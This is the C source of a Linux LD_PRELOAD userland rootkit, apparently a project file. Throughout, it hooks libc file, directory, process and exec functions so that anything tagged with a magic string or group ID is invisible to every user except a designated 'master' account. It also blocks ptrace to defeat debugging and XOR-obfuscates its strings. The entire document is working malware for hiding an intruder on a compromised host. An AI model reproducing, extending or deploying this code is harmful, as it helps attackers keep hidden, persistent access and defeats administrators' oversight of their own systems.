#define _GNU_SOURCE
#define _LARGEFILE_SOURCE 1
#include <stdio.h>
#include <unistd.h>
#include <strings.h>
#include <string.h> 
#include <dlfcn.h> 
#include <fcntl.h>
#include <errno.h> 
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <errno.h> 
#include <netinet/in.h> 
#include <dirent.h>
#include <limits.h> 
#include <pwd.h> 
#include <shadow.h> 

#include "rkheaders.h"
#include "rkconst.h"
#include "utils/clean.h" 
#include "utils/xor.c"
#include "utils/name_from_fd.c"
#include "utils/name_from_pid.c"
#include "utils/hide_procs.c"

void *libc;

int owned(void)
{ 
	#ifdef DEBUG
	printf("[!] owned called\n"); 
	#endif 

	char *user = strdup(USER); xor(user); 
	int x;
	struct passwd pwent; 
	struct passwd *pwp;
	char buf[1024];
	// need to improve this later
	getpwuid_r(getuid(), &pwent, buf, sizeof(buf), &pwp);
	if (pwp != NULL)
	{ 
		if ((strcmp(pwent.pw_name, user) == 0) || (getgid() == MAGICGID))
		{ 
			#ifdef DEBUG
			printf("[-] Hello master!\n");
			#endif 
			x = 1; 
		} 
		else
		{ 
			x = 0;
		}
	}	
	else
	{ 
		x = 0; 
	} 
	CLEAN(user);
	return x; 
} 

__attribute__ ((constructor)) static void init(void)
{ 
	#ifdef DEBUG
	printf("[rk] loaded: \n");
	#endif
	char *path = strdup(LIBC); xor(path); 
	libc = dlopen(path, RTLD_LAZY);
	CLEAN(path); 
}

int execve(const char *path, char *const argv[], char *const envp[]) 
{ 
	HOOK(execve); 
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] execve hooked\n"); 
	#endif 

	if (owned()) return old_execve(path, argv, envp);
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat);
	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_execve(path, argv, envp);
} 

long int ptrace(enum __ptrace_request request, ...)
{
	HOOK(ptrace);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] ptrace hooked\n"); 
	#endif 	
	char *msg = strdup(PTRACE_MSG); xor(msg); 
	printf("%s\n", msg); 
	exit(-1);
}

int stat(const char *path, struct stat *buf)
{
	HOOK(stat);
	#ifdef DEBUG
	printf("[!] stat hooked\n"); 
	#endif

	if (owned()) return old_stat(path, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old_stat(path, &filestat);
	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_stat(path, buf);	
}

int stat64(const char *path, struct stat64 *buf)
{ 
	HOOK(stat64);
	#ifdef DEBUG
	printf("[!] stat64 hooked"); 
	#endif	
	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat64 filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old_stat64(path, &filestat); 
	if (owned()) return old_stat64(path, buf); 
	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_stat64(path, buf); 
}

int __xstat(int ver, const char *path, struct stat *buf)
{ 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] __xstat hooked\n"); 
	#endif	
	
	if (owned()) return old___xstat(ver, path, buf);
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat);
	if ((strstr(path, magic) != NULL ) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old___xstat(ver, path, buf);
} 

int __lxstat(int ver, const char *path, struct stat *buf)
{ 
	HOOK(__lxstat); 
	#ifdef DEBUG 
	printf("[!] lxstat hooked\n"); 
	#endif 

	if (owned()) return old___lxstat(ver, path, buf); 
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old___lxstat(_STAT_VER, path, &filestat); 
	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old___lxstat(ver, path, buf); 
}
	
int __fxstat(int ver, int fildes, struct stat *buf)
{ 
	HOOK(__fxstat); 
	#ifdef DEBUG
	printf("[!] fxstat hooked\n"); 
	#endif 

	if (owned()) return old___fxstat(ver, fildes, buf);
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	char name[256];
	memset(&filestat, 0x00, sizeof(filestat));
	name_from_fd(fildes, name, sizeof(name));
	old___fxstat(_STAT_VER, fildes, &filestat); 
	if ((strstr((const char *)name, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old___fxstat(ver, fildes, buf);
}

int lstat(const char *pathname, struct stat *buf)
{ 
	HOOK(lstat); 
	#ifdef DEBUG 
	printf("[!] lstat hooked"); 
	#endif
	
	struct stat filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	if (owned()) return old_lstat(pathname, buf); 
	char *magic = strdup(MAGIC); xor(magic);
	old_lstat(pathname, &filestat); 
	if ((strstr(pathname, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_lstat(pathname, buf); 
}

int fstat(int fildes, struct stat *buf) 
{ 
	HOOK(fstat); 
	#ifdef DEBUG 
	printf("[!] fstat hooked\n"); 
	#endif
	
	if (owned()) return old_fstat(fildes, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat;
	char name[256];
    	memset(&filestat, 0x00, sizeof(filestat));
    	name_from_fd(fildes, name, sizeof(name));	
	old_fstat(fildes, &filestat);	
	if ((strstr((const char *)name, magic) != NULL ) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_fstat(fildes, buf);
}

int fstat64(int fd, struct stat64 *buf) 
{ 
	HOOK(fstat64); 
	#ifdef DEBUG
	printf("[!] fstat64 hooked\n"); 
	#endif 
	if (owned()) return old_fstat64(fd, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat;
	char name[256];
	name_from_fd(fd, name, sizeof(name));
	old_fstat64(fd, &filestat); 
	if ((strstr((const char *)name, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_fstat64(fd, buf); 
} 

int fstatat(int fd, const char *restrict path, struct stat *restrict buf, int flag)
{
	HOOK(fstatat); 
	#ifdef DEBUG
	printf("[!] fstatat hooked\n"); 
	#endif 
	if (owned()) return old_fstatat(fd, path, buf, flag);	
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat;
	char name[256];
	name_from_fd(fd, name, sizeof(name));
	old_fstatat(fd, path, &filestat, flag); 
	if ((strstr((const char *)name, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic);
	return old_fstatat(fd, path, buf, flag);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{ 
	HOOK(__xstat64); 
	#ifdef DEBUG 
	printf("[!] xstat64 hooked\n"); 
	#endif 

	if (owned()) return old___xstat64(ver, path, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old___xstat64(_STAT_VER, path, &filestat); 
	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old___xstat64(ver, path, buf);
}

int __lxstat64(int ver, const char *path, struct stat64 *buf)
{ 
	HOOK(__lxstat64); 
	#ifdef DEBUG 
	printf("[!] lxstat64 hooked\n"); 
	#endif 

	if (owned()) return old___lxstat64(ver, path, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat; 
	memset(&filestat, 0x00, sizeof(filestat));
	old___lxstat64(_STAT_VER, path, &filestat); 
	if ((strstr(path, magic)) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old___lxstat64(ver, path, buf);
}

int __fxstat64(int ver, int fildes, struct stat64 *buf)
{ 
	HOOK(__fxstat64); 
	#ifdef DEBUG 
	printf("[!] fxstat64 hooked\n"); 
	#endif 

	if (owned()) return old___fxstat64(ver, fildes, buf); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat;
	char name[256];	
	name_from_fd(fildes, name, sizeof(name));
	old___fxstat64(_STAT_VER, fildes, &filestat); 
	if (((strstr((const char *)name, magic)) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old___fxstat64(ver, fildes, buf);
}

off_t lseek(int fildes, off_t offset, int whence)
{ 
	HOOK(lseek);
	HOOK(__fxstat); 
	#ifdef DEBUG 
	printf("[!] lseek hooked\n");
	#endif

	if (owned()) return old_lseek(fildes, offset, whence); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat;
	char name[256];
	name_from_fd(fildes, name, sizeof(name));
	old___fxstat(_STAT_VER, fildes, &filestat); 
	if ((strstr((const char *)name, magic) != NULL) ||(filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = EBADF; 
		return -1;
	}
	CLEAN(magic);
	return old_lseek(fildes, offset, whence);
}

int link(const char *oldpath, const char *newpath)
{ 
	HOOK(link); 
	HOOK(__xstat);
	#ifdef DEBUG
       	printf("[!] link hooked\n"); 
	#endif	

	if (owned()) return old_link(oldpath, newpath); 	
	struct stat filestat;
	old___xstat(_STAT_VER, oldpath, &filestat);
	char *magic = strdup(MAGIC); xor(magic);
	if ((strstr(oldpath, magic) != NULL) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_link(oldpath, newpath); 
}	
int unlink(const char *path)
{
	HOOK(unlink);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] unlink hooked");
	#endif
       	
    if (owned()) return old_unlink(path); 
   	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat);
	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_unlink(path); 
}

// fix later 
int unlinkat(int dirfd, const char *path, int flags)
{
	HOOK(unlinkat); 
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] unlinkat hooked\n"); 
	#endif 

	if (owned()) return old_unlinkat(dirfd, path, flags); 	
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat); 
	if (((strstr(path, magic) != NULL )) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_unlinkat(dirfd, path, flags); 
}

int symlink(const char *path1, const char *path2)
{ 
	HOOK(symlink);
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] symlink hooked");
	#endif
	
	if (owned()) return old_symlink(path1, path2);
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat1, filestat2; 
	old___xstat(_STAT_VER, path1, &filestat1); 
	old___xstat(_STAT_VER, path2, &filestat2); 
	if (owned()) return old_symlink(path1, path2);
	if ((strstr(path1, MAGIC) != NULL)|| (filestat1.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
	 	return -1;
	}
	CLEAN(magic);	
	return old_symlink(path1, path2); 
}

int creat(const char *path, mode_t mode)
{ 
	HOOK(creat);
	HOOK(__lxstat);
	#ifdef DEBUG 
	printf("[!] creat hooked"); 
	#endif 

	if (owned()) return old_creat(path, mode); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___lxstat(_STAT_VER, path, &filestat);
	if ((strstr(path, magic) != NULL) || (filestat.st_gid==MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_creat(path, mode); 
} 

int fputs(const char *s, FILE *stream)
{ 
	HOOK(fputs); 
	HOOK(__fxstat);
	#ifdef DEBUG 
	printf("[!] fputs hooked\n"); 
	#endif 

	if (owned()) return old_fputs(s, stream); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	char name[256];
	int fd = fileno(stream);
	name_from_fd(fd, name, sizeof(name));
	old___fxstat(_STAT_VER, fd, &filestat);
	if ((strstr((const char *)name, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_fputs(s, stream); 
} 

size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
{ 
	HOOK(fwrite); 
	HOOK(__fxstat);
	#ifdef DEBUG 
	printf("[!] fwrite hooked\n"); 
	#endif 

	if (owned()) return old_fwrite(ptr, size, nmemb, stream);
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat;
	char name[256]; 
	int fd = fileno(stream); 
	name_from_fd(fd, name, sizeof(name));
	old___fxstat(_STAT_VER, fd, &filestat);
	if ((strstr((const char *)name, magic) != NULL ) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		return 0; 
	} 
	return old_fwrite(ptr, size, nmemb, stream);
}

size_t fwrite_unlocked(const void *ptr, size_t size, size_t n, FILE *stream)
{ 
	HOOK(fwrite_unlocked); 
	HOOK(__fxstat); 
	#ifdef DEBUG 
	printf("[!] fwrite_unlocked hooked\n"); 
	#endif 

	if (owned()) return old_fwrite_unlocked(ptr, size, n, stream); 
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	char name[256];
	int fd = fileno(stream); 
	name_from_fd(fd, name, sizeof(name));
	old___fxstat(_STAT_VER, fd, &filestat); 
	if ((strstr((const char *)name, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		return 0; 
	} 
	CLEAN(magic);
	return old_fwrite_unlocked(ptr, size, n, stream); 
}

size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
{ 
	HOOK(fread); 
	HOOK(__fxstat);
	#ifdef DEBUG 
	printf("[!] fread hooked\n"); 
	#endif 

	if (owned()) return old_fread(ptr, size, nmemb, stream); 
	struct stat filestat; 
	int fd = fileno(stream);
	old___fxstat(_STAT_VER, fd, &filestat);
	if (filestat.st_gid == MAGICGID)
	{ 
		return 0; 
	}
	return old_fread(ptr, size, nmemb, stream); 
}

int rename(const char *oldpath, const char *newpath)
{
	HOOK(rename);
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] rename hooked\n");
	#endif
	
	if (owned()) return old_rename(oldpath, newpath); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, oldpath, &filestat);
	if ((strstr(oldpath, magic) != NULL) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_rename(oldpath, newpath); 
}

int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath)
{ 
	HOOK(renameat); 
	HOOK(__fxstat);
	#ifdef DEBUG
	printf("[!] renameat hooked\n"); 
	#endif
	
	if (owned()) return old_renameat(olddirfd, oldpath, newdirfd, newpath); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat;
	old___fxstat(_STAT_VER, olddirfd, &filestat);
	if ((strstr(oldpath,  magic) != NULL) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_renameat(olddirfd, oldpath, newdirfd, newpath); 
}


// this hook is from azazel, creds to all original authors
struct dirent *readdir(DIR *dirp)
{ 
	HOOK(readdir);
	HOOK(fstat);
	#ifdef DEBUG 
	printf("[!] readdir hooked\n"); 
	#endif
	
	if (owned()) return old_readdir(dirp);
	char path[PATH_MAX + 1]; 
	struct dirent *dir; 
	struct stat filestat; 
	char *magic = strdup(MAGIC); xor(magic);
	char *proc_path = strdup(PROC_PATH); xor(proc_path);
	char *proc = strdup(PROC); xor(proc);
	char name[256];
	int dfd = dirfd(dirp); 
	name_from_fd(dfd, name, sizeof(name)); 
	if (strstr((const char *)name, proc) != NULL)
	{ 
		CLEAN(magic);
		CLEAN(proc); 
		CLEAN(proc_path);
		dir = hide_procs(dirp); 
		return dir;
	}	
	else
	{
		do 
		{ 
			dir = old_readdir(dirp); 
			if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, ".\0") == 0))
				continue; 
			if (dir != NULL)
			{ 
				int fd; 
				char fdpath[256], *dirname = (char *) malloc(sizeof(fdpath)); 
				memset(dirname, 0x0, sizeof(fdpath)); 
				fd = dirfd(dirp); 
				snprintf(fdpath, sizeof(fdpath) - 1, proc_path, fd); 
				readlink(fdpath, dirname, sizeof(fdpath) - 1); 
				snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
				old___xstat(_STAT_VER, path, &filestat); 
			} 
		} while (dir && ((filestat.st_gid == MAGICGID) || (strstr(path, magic) != NULL))); 
	}
	CLEAN(magic);
	CLEAN(proc);
	CLEAN(proc_path);
	return dir; 
} 

struct dirent64 *readdir64(DIR *dirp)
{ 
	HOOK(readdir64); 
	HOOK(__xstat64); 
	#ifdef DEBUG 
	printf("[!] readdir64 hooked\n"); 
	#endif 

	char path[PATH_MAX + 1]; 
	struct dirent64 *dir; 
	struct stat64 filestat; 
	char *magic = strdup(MAGIC); xor(magic);
	char *proc_path = strdup(PROC_PATH); xor(proc_path);
	if (owned()) return old_readdir64(dirp); 
	do 
	{ 
		dir = old_readdir64(dirp); 
		if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, ".\0") == 0))
			continue; 
		if (dir != NULL)
		{ 
			int fd; 
			char fdpath[256], *dirname = (char *) malloc(sizeof(fdpath)); 
			memset(dirname, 0x0, sizeof(fdpath)); 
			fd = dirfd(dirp); 
			snprintf(fdpath, sizeof(fdpath) - 1, proc_path, fd); 
			readlink(fdpath, dirname, sizeof(fdpath) - 1); 
			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
			old___xstat64(_STAT_VER, path, &filestat); 
		} 
	} while (dir && ((filestat.st_gid == MAGICGID)||strstr(path, magic) != NULL)); 
	CLEAN(magic);
	return dir; 
}


int chdir(const char *path)
{
       	/* cd still works on secret dirs because it is implemented in terms of cdir(2), not cdir(1) */	
	HOOK(chdir);
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] chdir hooked\n"); 
	#endif

       	struct stat filestat; 
	old___xstat(_STAT_VER, path, &filestat);	
	if (owned()) return old_chdir(path);
	char *magic = strdup(MAGIC); xor(magic);
	if (strstr(path, magic) != NULL || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_chdir(path);
} 

int fchdir(int fd)
{ 
	HOOK(fchdir); 
	HOOK(__fxstat); 
	#ifdef DEBUG 
	printf("[!] fchdir hooked\n"); 
	#endif

	if (owned()) return old_fchdir(fd);
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___fxstat(_STAT_VER, fd, &filestat);
	if (filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_fchdir(fd);
}

int mkdir(const char *pathname, mode_t mode)
{ 
	HOOK(mkdir);
	HOOK(__xstat);
	#ifdef DEBUG
	printf("[!] mkdir hooked\n"); 
	#endif 
	
	if (owned()) return old_mkdir(pathname, mode);
	char *magic = strdup(MAGIC); xor(magic);
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	return old_mkdir(pathname, mode);
} 

int mkdirat(int dirfd, const char *pathname, mode_t mode)
{ 
	HOOK(mkdirat); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] mkdirat hooked"); 
	#endif

	if (owned()) return old_mkdirat(dirfd, pathname, mode);
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic)) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT;
		return -1; 
	}
	CLEAN(magic);
	return old_mkdirat(dirfd, pathname, mode); 
}
	
int rmdir(const char *pathname)
{ 
	HOOK(rmdir); 
	HOOK(__xstat); 
	#ifdef DEBUG 
	printf("[!] rmdir hooked");
	#endif 

	struct stat filestat;
	old___xstat(_STAT_VER, pathname, &filestat);	
	if (owned()) return old_rmdir(pathname); 
	char *magic = strdup(MAGIC); xor(magic);
	if ((filestat.st_gid == MAGICGID) || strstr(pathname, magic))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1;
	}
	return old_rmdir(pathname); 
}

DIR *fdopendir(int fd)
{ 
	HOOK(fdopendir);
	HOOK(__fxstat);
	#ifdef DEBUG 
	printf("[!] fdopendir hooked\n"); 
	#endif 

	if (owned()) return old_fdopendir(fd); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___fxstat(_STAT_VER, fd, &filestat); 
	if (filestat.st_gid == MAGICGID)
	{
		CLEAN(magic); 
		errno = ENOENT; 
		return NULL; 
	}
	CLEAN(magic); 
	return old_fdopendir(fd);
}

DIR *opendir(const char *name)
{ 
	HOOK(opendir); 
	HOOK(__xstat);
	#ifdef DEBUG 
      	printf("[!] opendir hooked\n"); 
	#endif
	
	struct stat filestat; 
	old___xstat(_STAT_VER, name, &filestat);
	if (owned()) return old_opendir(name); 
	char *magic = strdup(MAGIC); xor(magic);
	if ((strstr(name, magic)) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT; 
		return NULL; 
	}
	CLEAN(magic);
	return old_opendir(name); 
} 

DIR *opendir64(const char *name)
{ 
	HOOK(opendir64); 
	HOOK(__xstat64); 
	#ifdef DEBUG 
	printf("[!] opendir64 hooked\n");
	#endif 

	struct stat64 filestat; 
	old___xstat64(_STAT_VER, name, &filestat); 
	if (owned()) return old_opendir64(name); 
	char *magic = strdup(MAGIC); xor(magic); 
	if ((strstr(name, magic)) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return NULL; 
	} 
	CLEAN(magic); 
	return old_opendir64(name); 
} 
/* WARNING:
 * Since I originally hooked the glibc wrappers and not the actual syscalls, everything after oflags is lost when I return the original function. This creates some weird file behavior. I will fix this in a future commit.
*/
/*
int open(const char *file, int oflag, ...)
{ 
	HOOK(open); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] open hooked\n"); 
	#endif 
	
	mode_t mode;
	if (owned()) return old_open(file, oflag); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	memset(&filestat, 0x0, sizeof(filestat));
	old___xstat(_STAT_VER, file, &filestat); 
	if ((strstr(file, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_open(file, oflag);
}
*/

/*
int open64(const char *file, int oflag, ...)
{ 
	HOOK(open64); 
	HOOK(__xstat64); 
	#ifdef DEBUG 
	printf("[!] open64 hooked\n"); 
	#endif
	if (owned()) return old_open64(file, oflag); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat; 
	memset(&filestat, 0x0, sizeof(filestat));
	old___xstat64(_STAT_VER, file, &filestat); 
	if ((strstr(file, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic); 
	return old_open64(file, oflag); 
}
*/

int openat(int fd, const char *path, int oflag, ...)
{ 
	HOOK(openat); 
	HOOK(__xstat); 
	#ifdef DEBUG 
	printf("[!] openat hooked\n"); 
	#endif 

	if (owned()) return old_openat(fd, path, oflag); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	memset(&filestat, 0x0, sizeof(filestat));
	old___xstat(_STAT_VER, path, &filestat); 
	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_openat(fd, path, oflag);
}

ssize_t pread(int fd, void *buf, size_t count, off_t offset) 
{ 
	HOOK(pread); 
	HOOK(fstat); 
	#ifdef DEBUG
	printf("[!] pread hooked\n"); 
	#endif 

	if (owned()) return old_pread(fd, buf, count, offset); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old_fstat(fd, &filestat);
	if (filestat.st_gid == MAGICGID) 
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic); 
	return old_pread(fd, buf, count, offset); 
} 

ssize_t pread64(int fd, void *buf, size_t count, off64_t offset)
{ 
	HOOK(pread64); 
	HOOK(fstat64); 	
	if (owned()) return old_pread64(fd, buf, count, offset); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat; 
	memset(&filestat, 0x00, sizeof(filestat)); 
	old_fstat64(fd, &filestat); 
	if (filestat.st_gid == MAGICGID) 
	{ 
		CLEAN(magic); 
		return -1; 
	} 
	CLEAN(magic); 
	return old_pread64(fd, buf, count, offset); 
} 

int access(const char *pathname, int mode)
{ 
	HOOK(access); 
	HOOK(__xstat);
	#ifdef DEBUG 
	printf("[!] access hooked\n"); 
	#endif

	if (owned()) return old_access(pathname, mode); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat; 
	old___xstat(_STAT_VER, pathname, &filestat);
	if ((strstr(pathname, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{ 
		CLEAN(magic);
		errno = ENOENT; 
		return -1; 
	}
	CLEAN(magic);
	return old_access(pathname, mode);
}

FILE *fopen(const char *pathname, const char *mode)
{ 
	HOOK(fopen);
       	HOOK(__xstat);	
	#ifdef DEBUG 
	printf("[!] fopen hooked\n"); 
	#endif 

	if (owned()) return old_fopen(pathname, mode);
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat filestat;
	old___xstat(_STAT_VER, pathname, &filestat); 	
	if ((strstr(pathname, magic) != NULL) || (filestat.st_gid == MAGICGID))
	{
		CLEAN(magic);
		errno = ENOENT;
		return NULL;
	}
	CLEAN(magic);
	return old_fopen(pathname, mode);
}	

FILE *fopen64(const char *pathname, const char *mode)
{ 
	HOOK(fopen64); 
	HOOK(__xstat64); 
	#ifdef DEBUG
	printf("[!] fopen64 hooked\n"); 
	#endif

	if (owned()) return old_fopen64(pathname, mode); 
	char *magic = strdup(MAGIC); xor(magic); 
	struct stat64 filestat; 
	old___xstat64(_STAT_VER, pathname, &filestat); 
	if ((strstr(pathname, magic) != NULL) || filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return NULL; 
	} 
	CLEAN(magic); 
	return old_fopen64(pathname, mode); 
} 


char *fgets(char *s, int size, FILE *stream)
{ 

	HOOK(fgets); 
	HOOK(__xstat);
    HOOK(access);	
	#ifdef DEBUG 
	printf("[!] fgets hooked\n"); 
	#endif
	
	struct stat filestat;
	char *p = old_fgets(s, size, stream);
	if (p == NULL)
		return(p);
	if (owned())
		return old_fgets(s, size, stream);
	if (old_access(s, F_OK) != -1) 
	{ 
		old___xstat(_STAT_VER, s, &filestat); 
		char *magic = strdup(MAGIC); xor(magic);
		int fd = fileno(stream); 
		char name[256];
		name_from_fd(fd, name, sizeof(name)); 
		if ((strstr((const char *)name, magic) != NULL) || (filestat.st_gid == MAGICGID))
		{ 
			CLEAN(magic); 
			return NULL; 
		}
		else
		{
			CLEAN(magic); 
			return p; // continue
		}	
	}
	return p;
}		
int chmod(const char *path, mode_t mode) 
{ 
	HOOK(chmod);
	#ifdef DEBUG 
	printf("[rk] chmod hooked\n");
	#endif
	
	struct stat filestat; 
	HOOK(__xstat);	
	old___xstat(_STAT_VER, path, &filestat);	
        if (owned()) return old_chmod(path, mode); 	
	char *magic = strdup(MAGIC); xor(magic);
	if ((strstr(path, magic) != NULL ) || filestat.st_gid == MAGICGID)
	{
		CLEAN(magic);
		errno = ENOENT; 
		return -1;
	}
	CLEAN(magic);
	return old_chmod(path, mode);
}

int fchmod(int fd, mode_t mode)
{ 
	HOOK(fchmod);
	#ifdef DEBUG 
	printf("[rk] fchmod hooked\n"); 
	#endif 

	struct stat filestat;
	HOOK(__fxstat); 
	old___fxstat(_STAT_VER, fd, &filestat); 
	if (owned()) return old_fchmod(fd, mode); 
	char *magic = strdup(MAGIC); xor(magic); 
	if (filestat.st_gid == MAGICGID)
	{ 
		CLEAN(magic); 
		errno = ENOENT; 
		return -1; 
	} 
	CLEAN(magic);  
	return old_fchmod(fd, mode); 
}	

